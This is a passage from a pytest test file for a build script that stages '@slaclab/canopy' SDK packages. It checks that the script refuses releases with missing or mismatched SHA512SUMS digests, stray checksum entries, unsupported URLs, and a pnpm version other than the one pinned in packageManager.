    ok(build(world, SDK_PACKS=f"file://{downloads.parent.parent}/{page}/v1/"))
    assert staged(world)["sdk_packages"]["runtime"]["@slaclab/canopy-client"] == resolved_entry("client")
    written = Path(f"{world['log']}.workspace").read_text()
    assert str(world["packs"]) not in written
    assert written.count(f"/packs/slaclab-canopy-client-{SDK_VERSION}.tgz\n") == 2


def test_a_release_without_sha512sums_is_refused(world, tmp_path):
    downloads = release(world, tmp_path)
    (downloads / "SHA512SUMS").unlink()
    refused_before_any_tool(world, build(world, SDK_PACKS=f"file://{downloads}"), "SHA512SUMS")


def test_a_release_pack_not_matching_its_digest_is_refused(world, tmp_path):
    downloads = release(world, tmp_path)
    (downloads / f"slaclab-canopy-shell-{SDK_VERSION}.tgz").write_bytes(b"swapped\n")
    proc = build(world, SDK_PACKS=f"file://{downloads}")
    refused_before_any_tool(world, proc, f"slaclab-canopy-shell-{SDK_VERSION}.tgz does not match its SHA512SUMS digest")


def test_a_release_listing_a_missing_pack_is_refused(world, tmp_path):
    downloads = release(world, tmp_path)
    (downloads / f"slaclab-canopy-vite-{SDK_VERSION}.tgz").unlink()
    proc = build(world, SDK_PACKS=f"file://{downloads}")
    refused_before_any_tool(world, proc, f"cannot fetch file://{downloads}/slaclab-canopy-vite-{SDK_VERSION}.tgz")


@pytest.mark.parametrize("name", ["../slaclab-canopy-client-0.3.1.tgz", "SHA512SUMS", "README.md"])
def test_a_sha512sums_line_naming_anything_but_a_pack_is_refused(world, tmp_path, name):
    downloads = release(world, tmp_path)
    with (downloads / "SHA512SUMS").open("a") as f:
        f.write(f"{'0' * 128}  {name}\n")
    refused_before_any_tool(world, build(world, SDK_PACKS=f"file://{downloads}"), "SHA512SUMS line 7 is not")


def test_a_pack_directory_with_sha512sums_is_checked(world):
    (world["packs"] / "SHA512SUMS").write_text(sha512sums(world["packs"]))
    ok(build(world))
    (world["packs"] / f"slaclab-canopy-react-{SDK_VERSION}.tgz").write_bytes(b"swapped\n")
    shutil.rmtree(world["out"])
    world["log"].unlink()
    refused_before_any_tool(world, build(world), "does not match its SHA512SUMS digest")


def test_a_pack_directory_with_a_pack_its_sha512sums_omits_is_refused(world):
    (world["packs"] / "SHA512SUMS").write_text(sha512sums(world["packs"]).split("\n", 1)[1])
    refused_before_any_tool(world, build(world), "is not listed in SHA512SUMS")


def test_sdk_packs_neither_a_directory_nor_a_url_is_refused(world):
    proc = build(world, SDK_PACKS="http://example.invalid/packs")
    assert proc.returncode != 0
    assert "is not a directory or an https:// or file:// URL" in proc.stderr
    assert calls(world) == []


def test_each_install_exempts_the_packs_from_release_age_policies(world):
    ok(build(world))
    written = Path(f"{world['log']}.workspace").read_text()
    exempt = "minimumReleaseAgeExclude:\n" + "".join(f"  - '@slaclab/canopy-{p}'\n" for p in PACKAGES)
    assert written.count(exempt) == 2


# --- the pnpm that runs ------------------------------------------------------------


@pytest.mark.parametrize("repo,label", [("rt", "runtime"), ("trace", "Trace")])
def test_a_pnpm_other_than_the_package_manager_named_is_refused(world, repo, label):
    commit(world[repo], {"package.json": '{"packageManager": "pnpm@11.1.1"}\n'}, "pin pnpm")
    proc = build(world, STUB_PNPM_VERSION="12.5.1")
    assert proc.returncode != 0
    assert f"pnpm 12.5.1 is on PATH, but the {label} (" in proc.stderr
    assert "names pnpm@11.1.1 in packageManager" in proc.stderr
    assert not [c for c in calls(world) if c[0] == "pnpm"]


def test_the_package_manager_named_with_its_hash_passes(world):
    for repo in ("rt", "trace"):
        commit(world[repo], {"package.json": '{"packageManager": "pnpm@11.1.1+sha512.abc"}\n'}, "pin pnpm")
    proc = build(world)
    ok(proc)
    assert "pnpm    11.1.1" in proc.stderr


def test_help_says_which_pnpm_runs(world):
    proc = build(world, "--help", out=False)
    ok(proc)
    assert "pnpm runs as found on PATH" in proc.stdout
    assert "releases/download/<tag>" in proc.stdout
